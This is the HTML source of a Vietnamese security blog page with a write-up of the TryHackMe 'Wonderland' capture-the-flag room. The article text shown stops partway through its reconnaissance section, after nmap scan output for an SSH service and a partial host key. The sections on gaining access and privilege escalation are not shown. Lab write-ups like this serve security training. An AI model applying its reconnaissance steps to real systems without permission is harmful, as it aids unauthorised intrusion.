<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  
    <title>Tryhackme - Wonderland &middot; Re-toor</title>
    <meta name="title" content="Tryhackme - Wonderland &middot; Re-toor">
  

  
  
  
    <meta name="keywords" content="web,linux,ssh,python library,capabilities,">
  
  
  
  <link rel="canonical" href="http://localhost:1313/ctf/tryhackme/wonderland/">
  

  
  
    <meta name="author" content="TAH">
  
  
    
      
        
          <link href="https://github.com/re-toor" rel="me">
        
      
    
      
        
          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
        
      
    
  

  
  <meta property="og:url" content="http://localhost:1313/ctf/tryhackme/wonderland/">
  <meta property="og:site_name" content="Re-toor">
  <meta property="og:title" content="Tryhackme - Wonderland">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2021-11-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-11-30T00:00:00+00:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Ssh">
    <meta property="article:tag" content="Python Library">
    <meta property="article:tag" content="Capabilities">
    <meta property="og:image" content="http://localhost:1313/ctf/tryhackme/wonderland/feature.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/ctf/tryhackme/wonderland/feature.png">
  <meta name="twitter:title" content="Tryhackme - Wonderland">

  
  
  
  
    
      
    
  
    
      
    
  
    
      
    
  
  
    
  

  
  
    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
  
  
  
  
  

  

  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
  
  
  
  
  
  
    
    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
  

  
  
  
    
  
  
    
  
  
    
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
      data-copy="Copy"
      data-copied="Copied"></script>
  

  
  
























  

  

  

  

  













  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Ctf",
    "name": "Tryhackme - Wonderland",
    "headline": "Tryhackme - Wonderland",
    
    "inLanguage": "en",
    "url" : "http://localhost:1313/ctf/tryhackme/wonderland/",
    "author" : {
      "@type": "Person",
      "name": "TAH"
    },
    "copyrightYear": "2021",
    "dateCreated": "2021-11-30T00:00:00\u002b00:00",
    "datePublished": "2021-11-30T00:00:00\u002b00:00",
    
    "dateModified": "2021-11-30T00:00:00\u002b00:00",
    
    "keywords": ["web","linux","ssh","python library","capabilities"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2170"
  },
  {
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [{
            "@type": "ListItem",
            "position":  1 ,
            "name": "TryHackMe",
            "item": "http://localhost:1313/ctf/tryhackme/"
          },{
            "@type": "ListItem",
            "position":  2 ,
            "name": "Ctf",
            "item": "http://localhost:1313/ctf/"
          },{
        "@type": "ListItem",
        "position":  3 ,
        "name": "Tryhackme - Wonderland",
        "item": "http://localhost:1313/ctf/tryhackme/wonderland/"
      }
    ]
  }]
  </script>



  
  

  
  

  
  

  
  
</head>


















  
  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
  
  
    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
      Re-toor
    </a>
  
  <div class="flex items-center ms-auto">
    <div class="hidden md:flex">
      <nav class="flex items-center gap-x-5 h-12">
  
    
      
  
    <a
      href="/blog/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="Blog"
      title="Blog">
      
      
        <span class="text-base font-medium break-normal">
          Blog
        </span>
      
    </a>
  

    
      
  
    <a
      href="/soc/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="SOC"
      title="SOC">
      
      
        <span class="text-base font-medium break-normal">
          SOC
        </span>
      
    </a>
  

    
      
  
    <div class="nested-menu">
      <div class="cursor-pointer flex items-center">
        <a
          
            href="/ctf/"
            
          
          aria-label="CTF"
          class="flex items-center text-base font-medium bf-icon-color-hover"
          title="Ctf">
          
          <span class="text-bg font-bg break-normal" title="Ctf">
            CTF
          </span>
          <span>
            <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
          </span>
        </a>
      </div>
      <div class="menuhide">
        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
          <div class="flex flex-col space-y-3">
            
              <a
                href="/ctf/hackthebox/"
                
                aria-label="HackTheBox"
                class="flex items-center bf-icon-color-hover">
                
                <span class="text-sm font-sm" title="HackTheBox">
                  HackTheBox
                </span>
              </a>
            
              <a
                href="/ctf/tryhackme/"
                
                aria-label="TryHackMe"
                class="flex items-center bf-icon-color-hover">
                
                <span class="text-sm font-sm" title="TryHackMe">
                  TryHackMe
                </span>
              </a>
            
              <a
                href="/ctf/selfdev/"
                
                aria-label="Self-dev"
                class="flex items-center bf-icon-color-hover">
                
                <span class="text-sm font-sm" title="Self-dev">
                  Self-dev
                </span>
              </a>
            
          </div>
        </div>
      </div>
    </div>
  

    
      
  
    <a
      href="/about/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="About"
      title="About">
      
      
        <span class="text-base font-medium break-normal">
          About
        </span>
      
    </a>
  

    
  

  

  

  
    <button
      id="search-button"
      aria-label="Search"
      class="text-base bf-icon-color-hover"
      title="Search (/)">
      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
    </button>
  

  
    <div class="flex items-center">
      <button
        id="appearance-switcher"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base bf-icon-color-hover">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    </div>
  
</nav>



    </div>
    <div class="flex md:hidden">
      <div class="flex items-center h-14 gap-4">
  
    <button
      id="search-button-mobile"
      aria-label="Search"
      class="flex items-center justify-center bf-icon-color-hover"
      title="Search (/)">
      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
    </button>
  

  
    <button
      id="appearance-switcher-mobile"
      type="button"
      aria-label="Dark mode switcher"
      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
      <div class="dark:hidden">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
      </div>
      <div class="hidden dark:block">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
      </div>
    </button>
  

  
    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
    </label>

    <div
      role="dialog"
      aria-modal="true"
      style="scrollbar-gutter: stable;"
      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
      bf-scrollbar">
      <label
        for="mobile-menu-toggle"
        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </label>
      <nav class="mx-auto max-w-md space-y-6">
        
  
    
    <div class="px-2">
      <a
        href="/blog/"
        aria-label="Blog"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Blog" class="text-2xl font-bold tracking-tight">
          Blog
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/soc/"
        aria-label="SOC"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="SOC" class="text-2xl font-bold tracking-tight">
          SOC
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/ctf/"
        aria-label="CTF"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Ctf" class="text-2xl font-bold tracking-tight">
          CTF
        </span>
        
          <label
            for="fullscreen-submenu-ctf"
            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
            <span class="relative block icon"><svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>
</span>
          </label>
        
      </a>

      
        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">

        <div
          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
          <div class="overflow-hidden">
            <div class="ms-7 mt-4">
              
                <a
                  href="/ctf/hackthebox/"
                  aria-label="HackTheBox"
                  
                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
                  
                  <span title="HackTheBox" class="text-lg">
                    HackTheBox
                  </span>
                </a>
              
                <a
                  href="/ctf/tryhackme/"
                  aria-label="TryHackMe"
                  
                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
                  
                  <span title="TryHackMe" class="text-lg">
                    TryHackMe
                  </span>
                </a>
              
                <a
                  href="/ctf/selfdev/"
                  aria-label="Self-dev"
                  
                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
                  
                  <span title="Self-dev" class="text-lg">
                    Self-dev
                  </span>
                </a>
              
            </div>
          </div>
        </div>
      
    </div>
  
    
    <div class="px-2">
      <a
        href="/about/"
        aria-label="About"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="About" class="text-2xl font-bold tracking-tight">
          About
        </span>
        
      </a>

      
    </div>
  

        
  

        
  

      </nav>
    </div>
  
</div>







    </div>
  </div>
</div>





    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        







  
  
    
  
    
  
    
  
    
  






  
    
    
      
      
    
  





    <div id="hero" class="h-[150px] md:h-[200px]"></div>
  
  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
    
    
    
    <img
      id="background-image"
      src="/ctf/tryhackme/wonderland/feature_hu_cd31ea2388ef56f.png"
      role="presentation"
      loading="eager"
      decoding="async"
      fetchpriority="high"
      class="absolute inset-0 w-full h-full object-cover"
      >
    <div
      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
    <div
      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
  </div>

  
    <div
      id="background-blur"
      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
    
    
    <script
      type="text/javascript"
      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
      data-blur-id="background-blur"
      data-image-id="background-image"
      data-image-url="/ctf/tryhackme/wonderland/feature_hu_cd31ea2388ef56f.png"></script>
  
      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Tryhackme - Wonderland
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2021-11-30T00:00:00&#43;00:00">30 November 2021</time><span class="px-2 text-primary-500">&middot;</span><span>2170 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span>
    

    
    
  </div>

  

  
  

  
  



      </div>
      
        
  
  
  
  
  
  

  

  

  

  

      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
            <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconnaissance">Reconnaissance</a></li>
    <li><a href="#ssh">SSH</a></li>
    <li><a href="#privilege-escalation">Privilege escalation</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconnaissance">Reconnaissance</a></li>
    <li><a href="#ssh">SSH</a></li>
    <li><a href="#privilege-escalation">Privilege escalation</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'
    let isJumpingToAnchor = false

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      if (isJumpingToAnchor) {
        for (let i = 0; i < anchors.length; i++) {
          const anchor = anchors[i]
          if (!tocIds.has(anchor.id)) continue
          const top = anchor.getBoundingClientRect().top + window.scrollY
          if (Math.abs(window.scrollY - top) < 100) {
            return anchor.id
          }
        }
      }

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      links.forEach(link => {
        link.addEventListener('click', () => {
          isJumpingToAnchor = true
        })
      })

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          <p>Hôm này tôi sẽ giải CTF <a href="https://tryhackme.com/room/wonderland"  target="_blank" rel="noreferrer">Tryhackme - Wonderland</a></p>

<h2 class="relative group">Reconnaissance
    <div id="reconnaissance" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Vẫn như thông thường thôi, việc đầu tiên là quét các cổng đang mở.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">REASON</span>  <span class="n">VERSION</span>
</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">8</span><span class="n">e</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="n">fb</span><span class="p">:</span><span class="mi">96</span><span class="p">:</span><span class="n">ce</span><span class="p">:</span><span class="n">ad</span><span class="p">:</span><span class="mi">70</span><span class="p">:</span><span class="n">dd</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="n">b0</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">63</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="n">AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn</span><span class="o">+</span><span class="n">xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1</span><span class="o">/</span><span class="n">rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp</span><span class="o">+</span><span class="n">E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA</span><span class="o">+</span><span class="n">eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0</span><span class="o">/</span><span class="n">Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5</span><span class="o">+</span><span class="n">h82rnWN</span>
